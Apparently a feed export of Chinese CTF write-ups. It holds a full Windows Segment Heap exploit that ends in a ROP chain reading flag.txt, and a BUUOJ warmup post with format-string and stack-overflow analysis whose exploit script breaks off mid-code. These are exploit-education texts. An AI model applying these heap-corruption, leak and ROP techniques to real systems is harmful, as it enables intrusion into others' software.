class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> winpwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./easy_wm_winpwn.exe"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">2</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">'1'</span>:</span><br><span class="line">    windbgx.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose</span><span class="params">(choice)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enter_game</span><span class="params">(id)</span>:</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Please enter user id:"</span>, str(id))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit_game</span><span class="params">()</span>:</span></span><br><span class="line">    choose(<span class="number">4</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span><span class="params">(tip, size=<span class="number">0</span>)</span>:</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    choose(tip)</span><br><span class="line">    <span class="keyword">if</span> tip == <span class="number">1</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">"Acquired size: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">improve</span><span class="params">(val)</span>:</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    p.sendline(str(val))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_wall</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"plz:"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_wall</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"plz:"</span>, str(idx))</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_wall</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"plz:"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enter_manage</span><span class="params">()</span>:</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit_manage</span><span class="params">()</span>:</span></span><br><span class="line">    choose(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_user</span><span class="params">(name, age)</span>:</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    p.sendafter(<span class="string">"Please enter username:"</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">"Please enter age:"</span>, str(age))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_user</span><span class="params">(id)</span>:</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Please enter user id:"</span>, str(id))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_user</span><span class="params">(id, name)</span>:</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Please enter user id:"</span>, str(id))</span><br><span class="line">    p.sendafter(<span class="string">"Please enter username:"</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy</span><span class="params">(id, offset, val)</span>:</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Please enter user id:"</span>, str(id))</span><br><span class="line">    p.sendlineafter(<span class="string">"You can get a huge gift because you defeated the monster"</span>, str(offset))</span><br><span class="line">    p.sendline(str(val))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bonus</span><span class="params">(id, val)</span>:</span></span><br><span class="line">    choose(<span class="number">0x3157C</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Please enter user id:"</span>, str(id))</span><br><span class="line">    p.sendline(str(val))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span><span class="params">(id)</span>:</span></span><br><span class="line">    enter_manage()</span><br><span class="line">    show_user(id)</span><br><span class="line">    exit_manage()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">arbitrary_read</span><span class="params">(addr)</span>:</span></span><br><span class="line">    payload = <span class="string">"A"</span> * <span class="number">0x48</span> + p64(addr)</span><br><span class="line">    edit_wall(<span class="number">6</span>, payload)</span><br><span class="line">    show_wall(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">'\r\n'</span>)[:<span class="number">-2</span>][:<span class="number">8</span>].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">arbitrary_write</span><span class="params">(addr, val)</span>:</span></span><br><span class="line">    payload = <span class="string">"A"</span> * <span class="number">0x48</span> + p64(addr)</span><br><span class="line">    edit_wall(<span class="number">6</span>, payload)</span><br><span class="line">    edit_wall(<span class="number">3</span>, val)</span><br><span class="line"></span><br><span class="line"><span class="comment"># off by one, change is_vip</span></span><br><span class="line">enter_manage()</span><br><span class="line">create_user(<span class="string">"AAA\n"</span>, <span class="number">0</span>)</span><br><span class="line">edit_user(<span class="number">0</span>, <span class="string">"A"</span> * <span class="number">0x50</span> + <span class="string">'\x01'</span>)</span><br><span class="line">exit_manage()</span><br><span class="line"></span><br><span class="line"><span class="comment"># use bonus to change hurt to a negative number</span></span><br><span class="line">bonus(<span class="number">0</span>, <span class="number">1</span> &lt;&lt; <span class="number">31</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># verify</span></span><br><span class="line">verify(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger dividing zero exception and make score = -1</span></span><br><span class="line">enter_game(<span class="number">0</span>)</span><br><span class="line">attack(<span class="number">3</span>)</span><br><span class="line">pause()</span><br><span class="line">improve(<span class="number">2</span>)</span><br><span class="line">exit_game()</span><br><span class="line"></span><br><span class="line"><span class="comment"># verify</span></span><br><span class="line">verify(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">enter_game(<span class="number">0</span>)</span><br><span class="line">attack(<span class="number">1</span>, <span class="number">0xfe90</span>) <span class="comment"># use up</span></span><br><span class="line">attack(<span class="number">1</span>, <span class="number">0x20000</span>) <span class="comment"># 2</span></span><br><span class="line">attack(<span class="number">2</span>) <span class="comment"># 3 (new vs blocks)</span></span><br><span class="line">attack(<span class="number">1</span>, <span class="number">0x20000</span>) <span class="comment"># 4 (gap)</span></span><br><span class="line">improve(<span class="number">4</span>) <span class="comment"># make score = -1</span></span><br><span class="line">delete_wall(<span class="number">2</span>)</span><br><span class="line">exit_game()</span><br><span class="line"></span><br><span class="line"><span class="comment"># backend block overlap</span></span><br><span class="line">buy(<span class="number">0</span>, <span class="number">0x3bb</span>, <span class="number">0x4204ffff00000002</span>) <span class="comment"># change backend block size (overlap)</span></span><br><span class="line"></span><br><span class="line">enter_game(<span class="number">0</span>)</span><br><span class="line">attack(<span class="number">1</span>, <span class="number">0x20000</span>) <span class="comment"># 5</span></span><br><span class="line">attack(<span class="number">2</span>) <span class="comment"># 6 (now overlap done)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap address</span></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x80</span></span><br><span class="line">edit_wall(<span class="number">6</span>, payload)</span><br><span class="line">show_wall(<span class="number">6</span>)</span><br><span class="line">p.recvuntil(p64(<span class="number">0x1a1a2b2b3c3c4d4d</span>))</span><br><span class="line">heap_addr = u64(p.recv(<span class="number">6</span>) + <span class="string">"\x00"</span> * <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak SEGMENT HEAP </span></span><br><span class="line">res = arbitrary_read(heap_addr - <span class="number">0x34010</span>)</span><br><span class="line">segment_heap_addr = res - <span class="number">0x148</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak and calulate HeapKey (ntdll!RtlpHpHeapGlobals-&gt;HeapKey)</span></span><br><span class="line">res = arbitrary_read(heap_addr - <span class="number">0x31fe0</span>)</span><br><span class="line">plain_head = <span class="number">0x100000012000f</span></span><br><span class="line">heapkey = res ^ (heap_addr - <span class="number">0x31fe0</span>) ^ plain_head</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak ntdll base through callbacks</span></span><br><span class="line">vs_context_addr = segment_heap_addr + <span class="number">0x280</span></span><br><span class="line">vs_context_callbacks_addr = vs_context_addr + <span class="number">0x88</span></span><br><span class="line">res = arbitrary_read(vs_context_callbacks_addr)</span><br><span class="line">RtlpHpSegVsAllocate_addr = (res ^ vs_context_addr ^ heapkey)</span><br><span class="line">ntdll_base = RtlpHpSegVsAllocate_addr - <span class="number">0x77440</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak PEB</span></span><br><span class="line">pebldr_addr = ntdll_base + <span class="number">0x16a4c0</span></span><br><span class="line">peb_addr = arbitrary_read(pebldr_addr - <span class="number">0x78</span>) - <span class="number">0x80</span></span><br><span class="line">teb_addr = peb_addr + <span class="number">0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak program base</span></span><br><span class="line">prog_base = arbitrary_read(peb_addr + <span class="number">0x12</span>) &lt;&lt; <span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak stack base</span></span><br><span class="line">stack_base = arbitrary_read(teb_addr + <span class="number">0xa</span>) &lt;&lt; <span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak ucrtbase base</span></span><br><span class="line">puts_iat = prog_base + <span class="number">0x4228</span></span><br><span class="line">puts_addr = arbitrary_read(puts_iat)</span><br><span class="line">ucrtbase_base = puts_addr - <span class="number">0x83d50</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak kernel32 base</span></span><br><span class="line">heap_create_iat = prog_base + <span class="number">0x4000</span></span><br><span class="line">heap_create_addr = arbitrary_read(heap_create_iat)</span><br><span class="line">kernel32_base = heap_create_addr - <span class="number">0x1ff50</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># brute force stack address</span></span><br><span class="line">game_ret_addr = prog_base + <span class="number">0x27f1</span></span><br><span class="line">stack_addr = stack_base - <span class="number">0x8</span></span><br><span class="line"><span class="keyword">while</span> stack_addr &gt; stack_base - <span class="number">0x3000</span>:</span><br><span class="line">    addr = arbitrary_read(stack_addr)</span><br><span class="line">    <span class="keyword">if</span> addr == game_ret_addr:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    stack_addr -= <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write rop</span></span><br><span class="line">pop_rcx = ucrtbase_base + <span class="number">0x2aa80</span></span><br><span class="line">pop_rdx = kernel32_base + <span class="number">0x24d92</span></span><br><span class="line">pop_r8 = ntdll_base + <span class="number">0x7223</span></span><br><span class="line">pop_4regs = ntdll_base + <span class="number">0x8c552</span> </span><br><span class="line">open_addr = ucrtbase_base + <span class="number">0xa5550</span></span><br><span class="line">read_addr = ucrtbase_base + <span class="number">0x182a0</span></span><br><span class="line"><span class="comment"># cmd_exe = ucrtbase_base + 0xd0cb0</span></span><br><span class="line"><span class="comment"># system_addr = ucrtbase_base + 0xae5c0</span></span><br><span class="line"><span class="comment"># payload = p64(pop_rcx) + p64(cmd_exe) + p64(pop_rcx + 1) + p64(system_addr)</span></span><br><span class="line">payload = p64(pop_rcx + <span class="number">1</span>) + p64(pop_rcx) + p64(stack_addr + <span class="number">0xd0</span>) + p64(pop_rdx) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line">payload += p64(pop_4regs) + p64(<span class="number">0</span>) * <span class="number">4</span></span><br><span class="line">payload += p64(pop_rcx) + p64(<span class="number">3</span>) + p64(pop_rdx) + p64(heap_addr) + p64(pop_r8) + p64(<span class="number">0x30</span>) + p64(read_addr)</span><br><span class="line">payload += p64(pop_4regs) + p64(<span class="number">0</span>) * <span class="number">4</span></span><br><span class="line">payload += p64(pop_rcx) + p64(heap_addr) + p64(puts_addr)</span><br><span class="line">payload += <span class="string">"flag.txt\x00"</span></span><br><span class="line">arbitrary_write(heap_addr + <span class="number">0x88</span>, p64(stack_addr))</span><br><span class="line">edit_wall(<span class="number">6</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger rop</span></span><br><span class="line">exit_game()</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[+]segment_heap_addr: %s"</span> % hex(segment_heap_addr))</span><br><span class="line">print(<span class="string">"[+]heapkey: %s"</span> % hex(heapkey))</span><br><span class="line">print(<span class="string">"[+]ntdll_base: %s"</span> % hex(ntdll_base))</span><br><span class="line">print(<span class="string">"[+]peb_addr: %s"</span> % hex(peb_addr))</span><br><span class="line">print(<span class="string">"[+]teb_addr: %s"</span> % hex(teb_addr))</span><br><span class="line">print(<span class="string">"[+]prog_base: %s"</span> % hex(prog_base))</span><br><span class="line">print(<span class="string">"[+]stack_base: %s"</span> % hex(stack_base))</span><br><span class="line">print(<span class="string">"[+]ucrtbase_base: %s"</span> % hex(ucrtbase_base))</span><br><span class="line">print(<span class="string">"[+]kernel32_base: %s"</span> % hex(kernel32_base))</span><br><span class="line">print(<span class="string">"[+]stack_addr: %s"</span> % hex(stack_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><ul><li><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Yason-Windows-10-Segment-Heap-Internals-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-16/materials/us-16-Yason-Windows-10-Segment-Heap-Internals-wp.pdf</a></li><li><a href="https://docs.microsoft.com/zh-cn/cpp/build/stack-usage?view=msvc-160" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/cpp/build/stack-usage?view=msvc-160</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文首发于安全客：&lt;a href=&quot;https://www.anquanke.com/post/id/253047&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/253047&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;比赛的时候没注意，一直把这题当成Nt Heap去做了，最后无功而返，准备等一下官方的writeup学习一下。结果最后没有公布，只能自己再摸索一番了，才发现是个Segment Heap题，由于之前也没有接触过，就比较针对性地学习了一下，同时分享一下解题思路，如果有错误还请批评指正。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Competition" scheme="https://n0nop.com/categories/Competition/"/>
    
    
      <category term="CTF" scheme="https://n0nop.com/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>BUUOJ 刷题记录 -- Windows Pwn</title>
    <link href="https://n0nop.com/2021/04/20/BUUOJ-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-Windows-Pwn/"/>
    <id>https://n0nop.com/2021/04/20/BUUOJ-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-Windows-Pwn/</id>
    <published>2021-04-20T14:35:37.000Z</published>
    <updated>2021-09-20T11:12:35.880Z</updated>
    
    <content type="html"><![CDATA[<p>本来去年暑假开始学习windows pwn，奈何需要备战考研所以搁置了，现在重新捡起来开始学习，记录一下BUUOJ上做的几个windows pwn题，总的来说windows pwn相对于linux pwn会略显复杂，机制更为繁琐，但是两者仍有一些共通之处。</p><p>此外，有关windows的一些保护机制以及绕过方式，将会结合题目一起提到而并不打算单独拎出来做总结。其实这方面的内容网上也有非常多的参考资料，整理得也相当好了，我也就不做过多得重复工作，遇到的时候再稍做记录效率会高一些。</p><a id="more"></a><h1 id="Windows-inCTF2019-warmup"><a href="#Windows-inCTF2019-warmup" class="headerlink" title="[Windows][inCTF2019]warmup"></a>[Windows][inCTF2019]warmup</h1><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>逻辑很简单，程序先是提供了一个格式化字符串漏洞：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fmt_str</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hHeap; <span class="comment">// [esp+0h] [ebp-2Ch]</span></span><br><span class="line">    <span class="keyword">void</span> *lpBuffer; <span class="comment">// [esp+4h] [ebp-28h]</span></span><br><span class="line">    <span class="keyword">char</span> fmt[<span class="number">24</span>]; <span class="comment">// [esp+8h] [ebp-24h] BYREF</span></span><br><span class="line">    <span class="keyword">int</span> v4; <span class="comment">// [esp+20h] [ebp-Ch]</span></span><br><span class="line">    __int16 v5; <span class="comment">// [esp+24h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(fmt, <span class="string">"Tell me what you want :"</span>);</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    hHeap = GetProcessHeap();</span><br><span class="line">    lpBuffer = HeapAlloc(hHeap, <span class="number">8u</span>, <span class="number">0x150</span>u);</span><br><span class="line">    <span class="built_in">printf</span>(fmt);</span><br><span class="line">    ReadFile(<span class="built_in">stdin</span>, lpBuffer, <span class="number">0x150</span>u, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>((<span class="keyword">char</span> *)lpBuffer);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后面直接给了个栈溢出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> Buffer[<span class="number">64</span>]; <span class="comment">// [esp+0h] [ebp-44h] BYREF</span></span><br><span class="line"></span><br><span class="line">    init_buf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome ------ Banner\n"</span>);</span><br><span class="line">    j_fmt_str();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Did you make something out of it ??? :"</span>);</span><br><span class="line">    ReadFile(<span class="built_in">stdin</span>, Buffer, <span class="number">0x60</span>u, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此外还提供了一个后门，直接读flag：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD NumberOfBytesWritten; <span class="comment">// [esp+0h] [ebp-30h] BYREF</span></span><br><span class="line">    HANDLE hFile; <span class="comment">// [esp+4h] [ebp-2Ch]</span></span><br><span class="line">    DWORD NumberOfBytesRead; <span class="comment">// [esp+8h] [ebp-28h] BYREF</span></span><br><span class="line">    <span class="keyword">char</span> Buffer[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-24h] BYREF</span></span><br><span class="line"></span><br><span class="line">    hFile = CreateFileA(aFlag, <span class="number">0x80000000</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3u</span>, <span class="number">0x80</span>u, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">while</span> ( ReadFile(hFile, Buffer, <span class="number">0x20</span>u, &amp;NumberOfBytesRead, <span class="number">0</span>)</span><br><span class="line">        &amp;&amp; NumberOfBytesRead</span><br><span class="line">        &amp;&amp; WriteFile(<span class="built_in">stdout</span>, Buffer, NumberOfBytesRead, &amp;NumberOfBytesWritten, <span class="number">0</span>) )</span><br><span class="line">        ;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>首先利用格式化字符串漏洞，读ebp，cookie和程序返回地址，从而得到程序加载的基地址。</li><li>由于栈溢出的字节数不够用，所以利用栈溢出劫持返回地址到<code>0x00406D3D</code>的位置： <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00406D34                 <span class="keyword">push</span>    <span class="number">0</span>               <span class="comment">; lpOverlapped</span></span><br><span class="line"><span class="symbol">.text:</span>00406D36                 <span class="keyword">push</span>    <span class="number">0</span>               <span class="comment">; lpNumberOfBytesRead</span></span><br><span class="line"><span class="symbol">.text:</span>00406D38                 <span class="keyword">push</span>    <span class="number">60h</span> <span class="comment">; '`'       ; nNumberOfBytesToRead</span></span><br><span class="line"><span class="symbol">.text:</span>00406D3A                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+Buffer]</span><br><span class="line"><span class="symbol">.text:</span>00406D3D                 <span class="keyword">push</span>    <span class="built_in">eax</span>             <span class="comment">; lpBuffer</span></span><br><span class="line"><span class="symbol">.text:</span>00406D3E                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, stdin</span><br><span class="line"><span class="symbol">.text:</span>00406D44                 <span class="keyword">push</span>    <span class="built_in">ecx</span>             <span class="comment">; hFile</span></span><br><span class="line"><span class="symbol">.text:</span>00406D45                 <span class="keyword">call</span>    <span class="built_in">ds</span>:ReadFile</span><br></pre></td></tr></table></figure> 这样，可以通过控制栈上传递给<code>ReadFile</code>的<code>lpOverlapped</code>、<code>lpNumberOfBytesRead</code>和<code>nNumberOfBytesToRead</code>（主要是这个）参数，实现再次栈溢出的效果，这样就可以读入一段更长的ROP。</li><li>但是由于远程环境中的flag是放在<code>flag.txt</code>里面的（简直坑爹），而后门里读的是/flag文件，显然直接跳到后门执行根本拿不到flag。</li><li>所以需要通过ROP把.data段上存放的”/flag”字符串给改成”./flag.txt”，再跳到后门执行即可。</li></ol><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> winpwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./warmup.exe"</span>)</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">2</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">'1'</span>:</span><br><span class="line">    windbgx.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote("node3.buuoj.cn", 26586)</span></span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x6C80</span></span><br><span class="line">stack_offset = <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak GS and ebp</span></span><br><span class="line">payload = <span class="string">"%p "</span> * <span class="number">13</span></span><br><span class="line">p.sendlineafter(<span class="string">"Tell me what you want :"</span>, payload)</span><br><span class="line">res = p.recvline()</span><br><span class="line">PIE = int(res[<span class="number">-12</span>:<span class="number">-4</span>], <span class="number">16</span>) - <span class="number">0x6D27</span></span><br><span class="line">cookie = int(res[<span class="number">-30</span>:<span class="number">-22</span>], <span class="number">16</span>)</span><br><span class="line">ebp = int(res[<span class="number">-21</span>:<span class="number">-13</span>], <span class="number">16</span>)</span><br><span class="line">GS = cookie ^ (ebp - <span class="number">0x4C</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read gadget to ReadFile return address</span></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x40</span> + p32(GS ^ ebp) <span class="comment"># cookie</span></span><br><span class="line">payload += p32(ebp) <span class="comment"># ebp</span></span><br><span class="line">payload += p32(PIE + <span class="number">0x6D3E</span>) <span class="comment"># return address (ReadFile)</span></span><br><span class="line">payload += p32(ebp) + p32(<span class="number">0x100</span>) + p32(<span class="number">0</span>) * <span class="number">2</span> <span class="comment"># args for ReadFile</span></span><br><span class="line">p.sendafter(<span class="string">"Did you make something out of it ??? :"</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write gadget "pop ebp; ret" to return address of ReadFile to bypass canary check</span></span><br><span class="line"><span class="comment"># ------ NOTICE: __stdcall ------</span></span><br><span class="line"><span class="comment"># and write gadget to change string "./flag" on .data segment to "./flag.txt" and then return to backdoor</span></span><br><span class="line">payload = p32(PIE + <span 